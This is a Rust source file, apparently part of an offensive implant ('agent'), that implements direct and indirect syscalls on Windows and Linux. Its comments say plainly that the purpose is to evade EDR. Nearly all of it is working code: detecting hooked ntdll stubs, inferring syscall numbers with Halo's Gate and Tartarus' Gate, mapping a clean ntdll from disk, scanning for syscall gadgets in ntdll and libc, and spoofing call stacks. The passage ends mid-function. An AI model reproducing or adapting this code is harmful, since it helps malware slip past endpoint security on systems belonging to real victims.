//! Direct/Indirect syscalls for Windows and Linux.
#![cfg(all(
    any(windows, target_os = "linux"),
    any(target_arch = "x86_64", target_arch = "aarch64")
))]

use anyhow::anyhow;
use anyhow::Result;
#[cfg(any(windows, all(unix, feature = "direct-syscalls")))]
use common::lock::MutexExt;
#[cfg(windows)]
use common::lock::RwLockExt;
#[cfg(windows)]
use std::arch::asm;

#[cfg(windows)]
use std::sync::atomic::{AtomicBool, AtomicU32, Ordering};

#[cfg(windows)]
use std::sync::{Mutex, OnceLock, RwLock};

#[cfg(windows)]
use std::collections::HashMap;

#[cfg(windows)]
static CLEAN_NTDLL: RwLock<Option<usize>> = RwLock::new(None);

/// Per-call SSN cache: function name → (ssn, gadget_addr, pe_timestamp).
/// The third element is the `TimeDateStamp` from the PE header of the clean
/// ntdll at the time the entry was cached — used for cross-reference validation.
#[cfg(windows)]
static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize, u32)>>> = OnceLock::new();

/// Cached Windows build number.  0 = not yet queried.
#[cfg(windows)]
static BUILD_NUMBER: AtomicU32 = AtomicU32::new(0);

/// Cached `TimeDateStamp` from the PE header of the clean-mapped ntdll.
#[cfg(windows)]
static CACHED_TIMESTAMP: AtomicU32 = AtomicU32::new(0);

/// Whether the cache has been invalidated and needs re-mapping on next access.
#[cfg(windows)]
static CACHE_DIRTY: AtomicBool = AtomicBool::new(false);

/// NTSTATUS codes for probe validation.
#[cfg(windows)]
const STATUS_INVALID_HANDLE: i32 = 0xC0000008_u32 as i32;
#[cfg(windows)]
const STATUS_INVALID_SYSTEM_SERVICE: i32 = 0xC000001C_u32 as i32;

/// `KUSER_SHARED_DATA` is always mapped at `0x7FFE0000`.
#[cfg(windows)]
const KUSER_SHARED_DATA: usize = 0x7FFE0000;
#[cfg(windows)]
const KUSD_OFFSET_BUILD: usize = 0x0260;

/// Cached address of a `ret` (0xC3) byte within `ntdll!NtQuerySystemTime`.
///
/// **Legacy fallback**: When the `stack-spoof` feature is active and the
/// unwind-aware `stack_db` module cannot resolve a multi-frame chain, this
/// single address is used as a one-frame spoof — identical to the original
/// behaviour.  The preferred path is `stack_db::build_chain()` which provides
/// multi-frame plausible call graph chains.
///
/// EDR kernel callbacks that walk the call stack then see ntdll as the
/// immediate caller of the syscall stub instead of agent memory.
#[cfg(all(windows, feature = "stack-spoof"))]
static NTDLL_SPOOF_FRAME: OnceLock<usize> = OnceLock::new();

/// Cached SSN for `NtContinue`.
///
/// Used by the NtContinue-based stack-spoof dispatch path to call NtContinue
/// directly via `syscall`/`svc` without going through `do_syscall` recursively.
/// 0 means unresolved or unavailable (fall back to `jmp`-based path).
///
/// Cross-arch: both x86_64 and aarch64 Windows use NtContinue for the
/// stack-spoof dispatch path.
#[cfg(all(windows, feature = "stack-spoof"))]
static NTCONTINUE_SSN: OnceLock<u32> = OnceLock::new();

#[cfg(windows)]
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    pub ssn: u32,
    pub gadget_addr: usize,
}

// ── Linux syscall infrastructure ─────────────────────────────────────────────
// NOTE: Linux direct-syscall execution is implemented in this file below:
//   - `syscall!` macro            (Linux): around line ~1216
//   - `do_syscall(ssn, args)`     (Linux): around line ~1249
//   - `get_syscall_id(name)`      (Linux): around line ~2044
// These top-level declarations are shared state/types used by that path.

#[cfg(target_os = "linux")]
use std::sync::{Mutex, OnceLock};

#[cfg(target_os = "linux")]
use std::collections::HashMap;

/// Per-call cache: syscall name → resolved SSN.  Built lazily on first use.
/// Used by Linux `get_syscall_id` in the lower Linux implementation block.
#[cfg(target_os = "linux")]
static LINUX_SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, u32>>> = OnceLock::new();

// ── SIGSYS handler for seccomp compatibility ───────────────────────────────
//
// When a Linux seccomp filter blocks a syscall with SECCOMP_RET_TRAP,
// the kernel delivers SIGSYS to the offending thread.  Without a handler
// the default disposition is `Core` (process termination + core dump).
// By installing a lightweight handler that sets a global atomic flag, we can
// detect seccomp-blocked syscalls and return a graceful error instead of
// crashing.
//
// # Async-signal-safety
//
// The previous implementation used `thread_local! { Cell<bool> }`, which is
// NOT async-signal-safe: `thread_local!` uses lazy TLS initialization
// (`pthread_getspecific` / `__tls_get_addr`) which may allocate memory on
// first access per thread.  Calling that from a signal context is undefined
// behaviour per POSIX.
//
// The current implementation uses a global `AtomicBool` instead:
// - `AtomicBool::store` is lock-free and async-signal-safe.
// - The flag is cleared before each syscall and checked after.
// - A theoretical race exists between threads, but the window is a single
//   `syscall` instruction.  A false positive would merely cause the caller
//   to treat a legitimate syscall return as EPERM — which is the same
//   error path as a genuine seccomp block and is handled gracefully.
//   A false negative cannot occur because seccomp blocks the syscall
//   *before* returning, so the signal handler runs while the calling thread
//   is still inside the `syscall` instruction (it will not proceed to clear
//   the flag until the signal handler returns and the syscall returns).

#[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
/// Global flag set by the SIGSYS handler when seccomp blocks a syscall.
/// Using a global `AtomicBool` instead of `thread_local!` ensures the signal
/// handler is fully async-signal-safe (no TLS lazy-init, no heap allocation).
static SECCOMP_BLOCKED: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);

/// SIGSYS signal handler.  Sets the global `SECCOMP_BLOCKED` flag so that
/// `do_syscall` can detect the blocked call and return an error.
///
/// # Safety
///
/// Called by the kernel in signal context.  Only performs an atomic store
/// (`Ordering::Release`), which is lock-free and async-signal-safe.
#[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
extern "C" fn sigsys_handler(
    _sig: libc::c_int,
    _info: *mut libc::siginfo_t,
    _ucontext: *mut libc::c_void,
) {
    SECCOMP_BLOCKED.store(true, std::sync::atomic::Ordering::Release);
}

/// Install a SIGSYS handler so that seccomp-blocked syscalls are reported via
/// an error return from `do_syscall` instead of terminating the process.
///
/// This is idempotent; calling it more than once is harmless.
///
/// Should be called once during agent initialisation, before any direct
/// syscall is attempted.
#[cfg(all(target_os = "linux", feature = "direct-syscalls"))]
pub fn install_sigsys_handler() {
    use std::mem;

    let mut sa: libc::sigaction = unsafe { mem::zeroed() };
    sa.sa_sigaction = sigsys_handler as *const () as usize;
    // SA_SIGINFO: receive siginfo_t and ucontext in the handler.
    // SA_RESTART: restart interrupted syscalls that aren't the blocked one.
    sa.sa_flags = libc::SA_SIGINFO | libc::SA_RESTART;
    unsafe {
        libc::sigemptyset(&mut sa.sa_mask);
    }

    let ret = unsafe { libc::sigaction(libc::SIGSYS, &sa, std::ptr::null_mut()) };
    if ret != 0 {
        tracing::error!(
            "sigsys: failed to install SIGSYS handler: {}",
            std::io::Error::last_os_error()
        );
    } else {
        tracing::debug!("sigsys: SIGSYS handler installed for seccomp compatibility");
    }
}

/// Minimal syscall descriptor for Linux: just the syscall number.
#[cfg(target_os = "linux")]
#[derive(Clone, Copy, Debug)]
pub struct SyscallTarget {
    pub ssn: u32,
}

// ── aarch64 Linux indirect-syscall gadget ─────────────────────────────────
//
// On aarch64 Linux, a direct `svc #0` instruction in the agent binary is a
// strong IoC.  To avoid it, we locate a `svc #0; ret` gadget inside a shared
// library that is already mapped into the process (typically libc.so) and
// branch to it via `blr`.  The gadget executes the supervisor call on behalf
// of the agent, so no `svc` instruction exists in agent code pages.

/// Cached address of a `svc #0; ret` sequence found in a loaded shared
/// library (libc).  Zero means "not yet resolved" or "unavailable".
#[cfg(all(
    target_os = "linux",
    target_arch = "aarch64",
    feature = "direct-syscalls"
))]
static LIBC_SVC_GADGET: OnceLock<usize> = OnceLock::new();

/// Scan the executable region of libc (loaded in the current process) for an
/// 8-byte `svc #0; ret` gadget.
///
/// The aarch64 encoding is:
///   svc #0  →  `0xD4000001`  (LE bytes: `01 00 00 D4`)
///   ret     →  `0xD65F03C0`  (LE bytes: `C0 03 5F D6`)
///
/// Returns the address of the first matching gadget, or 0 if none is found.
#[cfg(all(
    target_os = "linux",
    target_arch = "aarch64",
    feature = "direct-syscalls"
))]
fn find_libc_svc_gadget() -> usize {
    use std::fs;

    // Parse /proc/self/maps to find the first executable mapping of libc.
    let maps = match fs::read_to_string("/proc/self/maps") {
        Ok(m) => m,
        Err(_) => return 0,
    };

    for line in maps.lines() {
        // Example line:
        //   7f9a001000-7f9a020000 r-xp 00000000 fd:01 12345  /usr/lib/aarch64-linux-gnu/libc.so.6
        if !line.contains("libc") {
            continue;
        }
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 2 {
            continue;
        }
        let perms = parts[1];
        if !perms.contains('x') {
            continue; // skip non-executable mappings
        }

        // Parse address range.
        let addr_range: Vec<&str> = parts[0].split('-').collect();
        if addr_range.len() != 2 {
            continue;
        }
        let start = match usize::from_str_radix(addr_range[0], 16) {
            Ok(v) => v,
            Err(_) => continue,
        };
        let end = match usize::from_str_radix(addr_range[1], 16) {
            Ok(v) => v,
            Err(_) => continue,
        };
        let size = end.saturating_sub(start);
        if size < 8 {
            continue;
        }

        // Scan for the 8-byte gadget pattern: svc #0 (01 00 00 D4) + ret (C0 03 5F D6).
        // Insert a full memory barrier before reading the code page to prevent
        // the CPU from speculating / reordering the reads ahead of the address
        // resolution, which could return stale data if libc is being hot-patched
        // (e.g., by a security mitigation that remaps .text pages concurrently).
        std::sync::atomic::fence(std::sync::atomic::Ordering::SeqCst);
        let code = unsafe { std::slice::from_raw_parts(start as *const u8, size) };
        let pattern: [u8; 8] = [0x01, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6];
        for i in 0..=size - 8 {
            if code[i..i + 8] == pattern {
                let addr = start + i;
                tracing::debug!(
                    "find_libc_svc_gadget: found svc #0; ret gadget at {:#x}",
                    addr
                );
                return addr;
            }
        }
    }
    tracing::warn!("find_libc_svc_gadget: no svc #0; ret gadget found in libc");
    0
}

/// Scan up to 64 bytes of an `Nt*` stub looking for the `syscall` instruction
/// (0x0F 0x05) on x86-64, then search backward for `mov eax, imm32` (0xB8) to
/// extract the SSN.
#[cfg(all(windows, target_arch = "x86_64"))]
fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
    unsafe {
        let bytes = std::slice::from_raw_parts(func_addr as *const u8, 64);
        for j in 0..bytes.len().saturating_sub(1) {
            if bytes[j] == 0x0f && bytes[j + 1] == 0x05 {
                // syscall gadget
                for k in (0..j).rev() {
                    if bytes[k] == 0xb8 && k + 5 <= bytes.len() {
                        // mov eax, ssn
                        let ssn = u32::from_le_bytes(bytes[k + 1..k + 5].try_into().unwrap());
                        return Some(SyscallTarget {
                            ssn,
                            gadget_addr: func_addr + j,
                        });
                    }
                }
            }
        }
        None
    }
}

/// Scan up to 64 bytes (16 ARM64 instructions) of an `Nt*` stub looking for
/// `svc #0` (0xD4000001 LE), then search backward for `movz x8, #imm16`
/// (opcode mask 0xFFE0001F == 0xD2800008) to extract the SSN.
///
/// Handles `movk x8, #imm16, lsl #16` (opcode mask 0xFFE0001F == 0xF2A00008)
/// for SSNs > 65535 (unlikely but possible).
#[cfg(all(windows, target_arch = "aarch64"))]
fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
    unsafe {
        // ARM64 instructions are fixed-width 4 bytes, little-endian.
        let words = std::slice::from_raw_parts(func_addr as *const u32, 16);
        for j in 0..words.len() {
            // svc #0 = 0xD4000001
            if words[j] == 0xD4000001 {
                // Search backward for movz x8 / movk x8.
                let mut ssn: u32 = 0;
                let mut found_movz = false;
                for k in (0..j).rev() {
                    let w = words[k];
                    if (w & 0xFFE0001F) == 0xF2A00008 {
                        // movk x8, #imm16, lsl #16 — merge upper 16 bits.
                        let imm16 = ((w >> 5) & 0xFFFF) as u32;
                        ssn |= imm16 << 16;
                    } else if (w & 0xFFE0001F) == 0xD2800008 {
                        // movz x8, #imm16 — lower 16 bits (replaces).
                        let imm16 = ((w >> 5) & 0xFFFF) as u32;
                        ssn = (ssn & 0xFFFF0000) | imm16;
                        found_movz = true;
                        break;
                    }
                }
                if found_movz {
                    return Some(SyscallTarget {
                        ssn,
                        gadget_addr: func_addr + j * 4,
                    });
                }
            }
        }
        None
    }
}

/// Collect the virtual addresses of all `Nt`-prefixed exports from the loaded
/// module at `module_base`.  These represent the NT syscall stubs (or their
/// hooked replacements); only the addresses matter — callers sort them by VA
/// to approximate the monotonically-increasing SSN order used by Windows.
///
/// Returns an empty `Vec` if the PE export directory cannot be read.
#[cfg(windows)]
unsafe fn collect_nt_export_vas(module_base: usize) -> Vec<usize> {
    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
    use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY};

    let dos = &*(module_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return Vec::new(); // not a valid PE
    }
    let nt = &*((module_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let export_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
    let export_size = nt.OptionalHeader.DataDirectory[0].Size as usize;
    if export_rva == 0 || export_size == 0 {
        return Vec::new();
    }

    let dir = &*((module_base + export_rva) as *const IMAGE_EXPORT_DIRECTORY);
    let n_names = dir.NumberOfNames as usize;
    if n_names == 0 {
        return Vec::new();
    }

    let name_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNames as usize) as *const u32,
        n_names,
    );
    let ordinals = std::slice::from_raw_parts(
        (module_base + dir.AddressOfNameOrdinals as usize) as *const u16,
        n_names,
    );
    let func_rvas = std::slice::from_raw_parts(
        (module_base + dir.AddressOfFunctions as usize) as *const u32,
        dir.NumberOfFunctions as usize,
    );

    let mut result = Vec::new();
    for i in 0..n_names {
        let name_ptr = (module_base + name_rvas[i] as usize) as *const u8;
        // Accept only "Nt" followed by an uppercase letter — the signature of
        // NT syscall stubs.  This excludes "NtdllDefWindowProc" and similar
        // helper exports that are not syscall stubs.
        if *name_ptr != b'N' || *name_ptr.add(1) != b't' {
            continue;
        }
        if !(*name_ptr.add(2)).is_ascii_uppercase() {
            continue;
        }

        let ord = ordinals[i] as usize;
        if ord >= func_rvas.len() {
            continue;
        }
        let func_rva = func_rvas[ord] as usize;
        // Skip forwarded exports (RVA falls inside the export directory).
        if func_rva >= export_rva && func_rva < export_rva + export_size {
            continue;
        }
        result.push(module_base + func_rva);
    }
    result
}

/// Infer the SSN for a function at `target_addr` in `ntdll_base` using the
/// **Halo's Gate** technique.
///
/// Windows NT assigns syscall numbers in monotonically-increasing order when
/// `Nt*` exports are sorted by virtual address.  If `target_addr` is hooked
/// by an EDR (so `parse_syscall_stub` returns `None`), we sort all `Nt*` VAs,
/// locate the target's position, then scan outward through adjacent entries
/// for the first one whose stub is parseable.  The target's SSN is then:
///
///   inferred_ssn = neighbour_ssn ∓ distance
///
/// The `gadget_addr` field of the returned `SyscallTarget` is taken from the
/// neighbour's stub; callers that subsequently call `map_clean_ntdll` (which
/// performs its own gadget scan) ignore this field anyway.
///
/// Returns `None` if no parseable neighbour is found within 16 slots.
#[cfg(windows)]
unsafe fn infer_ssn_halo_gate(ntdll_base: usize, target_addr: usize) -> Option<SyscallTarget> {
    let mut vas = collect_nt_export_vas(ntdll_base);
    if vas.is_empty() {
        return None;
    }
    vas.sort_unstable();

    let target_idx = vas.iter().position(|&va| va == target_addr)?;

    const MAX_DELTA: usize = 16;
    for delta in 1..=MAX_DELTA {
        // Higher-VA neighbour → higher SSN: inferred = neighbour_ssn - delta.
        if let Some(&upper_va) = vas.get(target_idx + delta) {
            if let Some(t) = parse_syscall_stub(upper_va) {
                if let Some(inferred) = t.ssn.checked_sub(delta as u32) {
                    tracing::debug!(
                        "halo_gate: SSN {} inferred for {:#x} (upper+{} SSN={})",
                        inferred,
                        target_addr,
                        delta,
                        t.ssn
                    );
                    return Some(SyscallTarget {
                        ssn: inferred,
                        gadget_addr: t.gadget_addr,
                    });
                }
            }
        }
        // Lower-VA neighbour → lower SSN: inferred = neighbour_ssn + delta.
        if delta <= target_idx {
            if let Some(t) = parse_syscall_stub(vas[target_idx - delta]) {
                let inferred = t.ssn + delta as u32;
                tracing::debug!(
                    "halo_gate: SSN {} inferred for {:#x} (lower-{} SSN={})",
                    inferred,
                    target_addr,
                    delta,
                    t.ssn
                );
                return Some(SyscallTarget {
                    ssn: inferred,
                    gadget_addr: t.gadget_addr,
                });
            }
        }
    }
    tracing::warn!(
        "halo_gate: could not infer SSN for {:#x} within {} neighbours",
        target_addr,
        MAX_DELTA
    );
    None
}

/// Scan the `.text` section of the ntdll module loaded at `ntdll_base` for a
/// valid `syscall` (or `syscall; ret`) gadget.  Returns the address of the
/// first valid gadget found, or `None` if no valid gadget exists.
///
/// Called from `get_bootstrap_ssn` when the target Nt* stub is found to be
/// hooked so that the returned `SyscallTarget` carries a clean, unhooked
/// gadget address rather than the EDR-controlled trampoline address.
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
    use windows_sys::Win32::System::Diagnostics::Debug::{
        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
    };
    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;

    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let p_sections = (nt as *const _ as usize
        + 4  // Signature (DWORD)
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
        + nt.FileHeader.SizeOfOptionalHeader as usize)
        as *const IMAGE_SECTION_HEADER;

    for i in 0..nt.FileHeader.NumberOfSections {
        let section = &*p_sections.add(i as usize);
        let name = &section.Name;
        if name[0] == b'.'
            && name[1] == b't'
            && name[2] == b'e'
            && name[3] == b'x'
            && name[4] == b't'
        {
            let start = ntdll_base + section.VirtualAddress as usize;
            let size = section.Misc.VirtualSize as usize;
            let code = std::slice::from_raw_parts(start as *const u8, size);
            for j in 0..size.saturating_sub(3) {
                if code[j] == 0x0f && code[j + 1] == 0x05 {
                    let candidate = start + j;
                    let gadget_len = if code[j + 2] == 0xc3 { 3 } else { 2 };
                    if gadget_is_valid(candidate, gadget_len) {
                        return Some(candidate);
                    }
                }
            }
            break;
        }
    }
    None
}

/// Scan the `.text` section of the ntdll module loaded at `ntdll_base` for a
/// valid `svc #0; ret` (or bare `svc #0`) gadget on ARM64 Windows.
///
/// ARM64 uses fixed-width 32-bit instructions, so the scan walks in 4-byte
/// steps looking for the `svc #0` opcode (0xD4000001) followed optionally by
/// `ret` (0xD65F03C0).
#[cfg(all(windows, target_arch = "aarch64"))]
unsafe fn scan_text_for_syscall_gadget(ntdll_base: usize) -> Option<usize> {
    use windows_sys::Win32::System::Diagnostics::Debug::{
        IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
    };
    use windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;

    let dos = &*(ntdll_base as *const IMAGE_DOS_HEADER);
    if dos.e_magic != 0x5A4D {
        return None;
    }
    let nt = &*((ntdll_base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
    let p_sections = (nt as *const _ as usize
        + 4
        + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>()
        + nt.FileHeader.SizeOfOptionalHeader as usize)
        as *const IMAGE_SECTION_HEADER;

    for i in 0..nt.FileHeader.NumberOfSections {
        let section = &*p_sections.add(i as usize);
        let name = &section.Name;
        if name[0] == b'.'
            && name[1] == b't'
            && name[2] == b'e'
            && name[3] == b'x'
            && name[4] == b't'
        {
            let start = ntdll_base + section.VirtualAddress as usize;
            let size = section.Misc.VirtualSize as usize;
            // ARM64 instructions are 4 bytes wide — scan in u32 steps.
            let n_words = size / 4;
            let words = std::slice::from_raw_parts(start as *const u32, n_words);
            for j in 0..n_words {
                if words[j] == 0xD4000001 {
                    // svc #0 found
                    let candidate = start + j * 4;
                    // Prefer svc #0; ret (8 bytes), accept bare svc #0 (4 bytes).
                    let gadget_len = if j + 1 < n_words && words[j + 1] == 0xD65F03C0 {
                        8
                    } else {
                        4
                    };
                    if gadget_is_valid(candidate, gadget_len) {
                        return Some(candidate);
                    }
                }
            }
            break;
        }
    }
    None
}

#[cfg(all(windows, target_arch = "x86_64"))]
fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        // Hook detection: inspect the first two bytes.  Unhooked 64-bit
        // Nt* stubs start with one of:
        //   0x4C 0x8B D1   — MOV R10, RCX
        //   0xB8 xx xx xx  — MOV EAX, <SSN>
        let prologue = std::slice::from_raw_parts(func_addr as *const u8, 2);
        let is_hooked = !((prologue[0] == 0x4C && prologue[1] == 0x8B) || prologue[0] == 0xB8);

        if !is_hooked {
            if let Some(t) = parse_syscall_stub(func_addr) {
                return Some(t);
            }
        }

        #[cfg(feature = "direct-syscalls")]
        {
            if is_hooked {
                if let Some(ssn) = crate::exception_ssn::resolve_ssn_via_exception(func_name) {
                    tracing::info!(
                        "get_bootstrap_ssn: {func_name}: resolved SSN={} via exception-based (Tartarus' Gate)",
                        ssn
                    );
                    let gadget_addr =
                        scan_text_for_syscall_gadget(ntdll_base).unwrap_or_else(|| func_addr);
                    return Some(SyscallTarget { ssn, gadget_addr });
                }
                tracing::debug!(
                    "get_bootstrap_ssn: {func_name}: exception-based SSN failed, \
                     falling back to Halo's Gate"
                );
            }
        }

        if is_hooked {
            tracing::warn!(
                "get_bootstrap_ssn: {func_name} stub appears hooked \
                 (prologue: {:#04x} {:#04x}); using Halo's Gate + .text gadget scan",
                prologue[0],
                prologue[1]
            );
        } else {
            tracing::warn!(
                "get_bootstrap_ssn: {func_name} stub prologue looks clean but \
                 parse_syscall_stub failed; falling back to Halo's Gate"
            );
        }

        let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;

        if is_hooked {
            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                return Some(SyscallTarget {
                    ssn: ssn_target.ssn,
                    gadget_addr,
                });
            }
            tracing::warn!(
                "get_bootstrap_ssn: {func_name}: no clean syscall;ret gadget found \
                 in ntdll .text; using Halo's Gate neighbour gadget as fallback"
            );
        }

        Some(ssn_target)
    }
}

/// ARM64 Windows variant of `get_bootstrap_ssn`.
///
/// Hook detection on ARM64 checks whether the first instruction is
/// `movz x8, #imm16` (opcode mask 0xFFE0001F == 0xD2800008), which is
/// the standard prologue of an unhooked ntdll syscall stub.  A hooked stub
/// typically starts with a branch instruction (`b <offset>` or `br xN`).
#[cfg(all(windows, target_arch = "aarch64"))]
fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
    unsafe {
        let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(ntdll_base, target_hash)?;

        // ARM64 hook detection: read the first instruction (4 bytes LE).
        // Unhooked stubs begin with movz x8, #imm16: (word & 0xFFE0001F) == 0xD2800008.
        let first_word = std::ptr::read_unaligned(func_addr as *const u32);
        let is_hooked = (first_word & 0xFFE0001F) != 0xD2800008;

        if !is_hooked {
            if let Some(t) = parse_syscall_stub(func_addr) {
                return Some(t);
            }
        }

        if is_hooked {
            tracing::warn!(
                "get_bootstrap_ssn: {func_name} stub appears hooked \
                 (first instruction: {:#010x}); using Halo's Gate + .text gadget scan",
                first_word
            );
        } else {
            tracing::warn!(
                "get_bootstrap_ssn: {func_name} stub prologue looks clean but \
                 parse_syscall_stub failed; falling back to Halo's Gate"
            );
        }

        let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;

        if is_hooked {
            if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
                return Some(SyscallTarget {
                    ssn: ssn_target.ssn,
                    gadget_addr,
                });
            }
            tracing::warn!(
                "get_bootstrap_ssn: {func_name}: no clean svc #0 gadget found \
                 in ntdll .text; using Halo's Gate neighbour gadget as fallback"
            );
        }

        Some(ssn_target)
    }
}

#[cfg(windows)]
fn map_clean_ntdll() -> Result<usize> {
    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
    let sys_ntopenfile =
        get_bootstrap_ssn("NtOpenFile").ok_or_else(|| anyhow!("No NtOpenFile SSN"))?;
    let sys_ntcreatesection =
        get_bootstrap_ssn("NtCreateSection").ok_or_else(|| anyhow!("No NtCreateSection SSN"))?;
    let sys_ntmapview =
        get_bootstrap_ssn("NtMapViewOfSection").ok_or_else(|| anyhow!("No NtMapView SSN"))?;

    let mut ntdll_nt_path = format!(r"\??\{}\System32\ntdll.dll", sysroot)
        .encode_utf16()
        .chain(std::iter::once(0))
        .collect::<Vec<u16>>();

    unsafe {
        // Resolve loaded ntdll via the shared pe_resolve module to avoid
        // maintaining a duplicate local PEB/LDR walker in this file.
        let loaded_ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)
            .ok_or_else(|| anyhow!("Could not resolve loaded ntdll base"))?;

        // Find gadget — delegate to the arch-specific scanner.
        let gadget_addr = scan_text_for_syscall_gadget(loaded_ntdll_base)
            .ok_or_else(|| anyhow!("Failed to find syscall gadget in loaded ntdll"))?;

        let mut obj_name: crate::win_types::UNICODE_STRING = std::mem::zeroed();
        obj_name.Length = ((ntdll_nt_path.len() - 1) * 2) as u16;
        obj_name.MaximumLength = (ntdll_nt_path.len() * 2) as u16;
        obj_name.Buffer = ntdll_nt_path.as_mut_ptr();

        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
        obj_attr.ObjectName = &mut obj_name;
        obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE

        let mut io_status: [u64; 2] = [0, 0];
        let mut h_file: crate::win_types::HANDLE = std::ptr::null_mut();

        let status = do_syscall(
            sys_ntopenfile.ssn,
            gadget_addr,
            &[
                &mut h_file as *mut _ as u64,
                0x80100000, // SYNCHRONIZE | FILE_READ_DATA (GENERIC_READ)
                &mut obj_attr as *mut _ as u64,
                &mut io_status as *mut _ as u64,
                1,    // FILE_SHARE_READ
                0x20, // FILE_SYNCHRONOUS_IO_NONALERT
            ],
        );
        if status != 0 {
            return Err(anyhow!("NtOpenFile failed: {:x}", status));
        }

        let mut h_section: crate::win_types::HANDLE = std::ptr::null_mut();
        let status = do_syscall(
            sys_ntcreatesection.ssn,
            gadget_addr,
            &[
                &mut h_section as *mut _ as u64,
                0x000f0000 | 0x0004 | 0x0008, // SECTION_MAP_READ | SECTION_MAP_EXECUTE | STANDARD_RIGHTS_REQUIRED
                std::ptr::null_mut::<u64>() as u64,
                std::ptr::null_mut::<u64>() as u64,
                0x20,      // PAGE_EXECUTE_READ
                0x1000000, // SEC_IMAGE
                h_file as u64,
            ],
        );

        pe_resolve::close_handle(h_file as *mut _);
        if status != 0 {
            return Err(anyhow!("NtCreateSection failed: {:x}", status));
        }

        let mut base_addr: crate::win_types::PVOID = std::ptr::null_mut();
        let mut view_size: crate::win_types::SIZE_T = 0;

        let status = do_syscall(
            sys_ntmapview.ssn,
            gadget_addr,
            &[
                h_section as u64,
                -1isize as u64, // CurrentProcess
                &mut base_addr as *mut _ as u64,
                0,
                0,
                std::ptr::null_mut::<u64>() as u64,
                &mut view_size as *mut _ as u64,
                1, // ViewShare
                0,
                0x20, // PAGE_EXECUTE_READ
            ],
        );

        pe_resolve::close_handle(h_section as *mut _);
        if status != 0 {
            return Err(anyhow!("NtMapViewOfSection failed: {:x}", status));
        }

        Ok(base_addr as usize)
    }
}

#[cfg(windows)]
fn read_export_dir(base: usize, func_name: &str) -> Result<SyscallTarget> {
    unsafe {
        let mut name = func_name.as_bytes().to_vec();
        name.push(0);
        let target_hash = pe_resolve::hash_str(&name);
        let func_addr = pe_resolve::get_proc_address_by_hash(base, target_hash)
            .ok_or_else(|| anyhow!("Function {} not found in clean ntdll", func_name))?;

        parse_syscall_stub(func_addr).ok_or_else(|| {
            anyhow!(
                "Function {} found in clean ntdll but could not parse SSN",
                func_name
            )
        })
    }
}

#[cfg(windows)]
pub fn get_syscall_id(func_name: &str) -> Result<SyscallTarget> {
    let cache_lock = SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));

    // Fast path: check cache.
    if let Some(&(ssn, gadget_addr, _ts)) = cache_lock.lock_recover().get(func_name) {
        return Ok(SyscallTarget { ssn, gadget_addr });
    }

    let base =
        {
            let guard = CLEAN_NTDLL.read_recover();
            if let Some(&b) = guard.as_ref().filter(|&&b| b != 0) {
                b
            } else {
                drop(guard); // release read lock before write
                let mut guard = CLEAN_NTDLL.write_recover();
                // Double-check after acquiring write lock
                if let Some(&b) = guard.as_ref().filter(|&&b| b != 0) {
                    b
                } else {
                    match map_clean_ntdll() {
                        Ok(b) => {
                            let ts = unsafe { read_pe_timestamp(b) };
                            CACHED_TIMESTAMP.store(ts, Ordering::Release);
                            let _ = get_build_number();
                            tracing::debug!(
                            "syscalls: clean ntdll mapped at {:#x} (timestamp={:#010x}, build={})",
                            b, ts, BUILD_NUMBER.load(Ordering::Acquire)
                        );
                            *guard = Some(b);
                            b
                        }
                        Err(e) => {
                            tracing::warn!(
